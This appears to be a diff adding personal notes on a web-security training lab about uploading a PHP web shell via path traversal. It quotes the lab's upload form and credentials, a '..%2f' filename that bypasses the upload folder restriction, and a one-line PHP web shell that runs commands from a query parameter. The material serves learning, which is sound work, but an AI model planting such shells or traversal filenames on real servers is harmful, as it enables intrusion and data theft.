@@ -1,0 +1,37 @@
+Lab: Web shell upload via path traversal
+
+ This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.
+
+To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
+
+You can log in to your own account using the following credentials: wiener:peter 
+
+
+<form class="login-form" id="avatar-upload-form" action="/my-account/avatar" method="POST" enctype="multipart/form-data">
+                            <p>
+                            <img src="/files/avatars/dcadcb65a0d09398fa3cce9d46c55423.jpg" class="avatar">
+                            </p>
+                            <label>Avatar:</label>
+                            <input type="file" name="avatar">
+                            <input type="hidden" name="user" value="wiener">
+                            <input required="" type="hidden" name="csrf" value="p4oHOsRrf8xv1yUq4fBq0HzvwQ3YCQKS">
+                            <button class="button" type="submit">Upload</button>
+                        </form>
+
+
+Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
+
+The file avatars/../exploit.php has been uploaded.<p>
+
+lets see what we have in the files directory
+
+https://0ade002a03bada188186e8dd00dd003d.web-security-academy.net/files/exploit.php
+
+
+
+F2juWUa9ULSF5t2FLmG2T1ooEnOxbVkW
+
+
+if you use <?php echo system($_GET['command']); ?>
+
+cmd=ls you can try using thing like that to try if u can execute cmd commands
